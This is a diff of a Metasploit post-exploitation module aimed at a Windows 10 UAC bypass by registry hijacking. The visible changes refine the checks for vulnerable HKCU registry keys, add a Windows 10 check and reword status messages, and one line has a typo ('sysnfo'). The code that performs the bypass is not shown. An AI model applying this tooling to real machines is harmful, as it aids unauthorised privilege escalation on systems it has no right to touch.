@@ -118,11 +118,11 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover: enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
+                        'Version'        => '$Revision: 1.4',
                         'DisclosureDate' => 'mar 18 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'false', # thats no need for privilege escalation..
+                        'Privileged'     => 'false',     # thats no need for privilege escalation..
                         'Targets'        =>
                                 [
                                          [ 'Windows 10' ] # Only works againts Windows 10
@@ -137,7 +137,7 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1',          # Default its to run againts session 1
+                                         'SESSION' => '1',  # Default its to run againts session 1
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -371,13 +371,16 @@ def ls_stage3
 
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(2.0)
-    # check target registry hive/key settings (hijacking key)
+    # check target registry hive/key settings (hijacking hive/key)
     if registry_getvaldata("#{vuln_key}","#{vul_value}")
       vuln_stats = "#{vuln_key}\\#{vul_value}"
-      report_tw = "HIJACK KEY ACTIVE"
+      report_tw = "REGISTRY HIJACK KEY FOUND (Active)"
+    elsif registry_enumkeys("HKCU\\Software\\Classes\\exefile")
+      vuln_stats = "HKCU\\Software\\Classes\\exefile"
+      report_tw = "REGISTRY HIVE FOUND (Vulnerable)"
     else
-      vuln_stats = "NOT FOUND"
-      report_tw = "HIJACK KEY NOT PRESENT"
+      vuln_stats = "HKCU\\Software\\Classes\\exefile"
+      report_tw = "REGISTRY HIVE NOT FOUND (Not Vulnerable)"
     end
 
     # check target registry hive/key settings (UAC level settings)
@@ -410,18 +413,6 @@ def ls_stage3
     print_line("")
     print_line("")
     Rex::sleep(1.0)
-
-  # building better reports outputs
-  if vuln_stats == "NOT FOUND"
-    print_line("    REPORT : None hijacking registry key was found under -> [HKCU]")
-    print_line("           : that allows local/remote-code execution (enigma bypass)")
-  else
-    print_line("    REPORT : Hijacking method its active, waiting for #{vuln_soft}")
-    print_line("           : execution to run injected string in target machine ..")
-  end
-
-Rex::sleep(1.0)
-print_line("")
 end
 
 
@@ -467,13 +458,18 @@ def run
       print_error("[ ABORT ]: This module only works againts windows systems")
       return nil
     end
+    # check for proper operative system (windows 10)
+    if not sysinfo['OS'] =~ /Windows 10/
+      print_error("[ ABORT ]: This module only works againt windows 10 systems")
+      return nil
+    end
     # check for proper session (meterpreter)
     # the non-return of sysinfo command reveals
     # that we are not on a meterpreter session!
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
+      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
       return nil
     end
     # elevate session privileges befor runing options
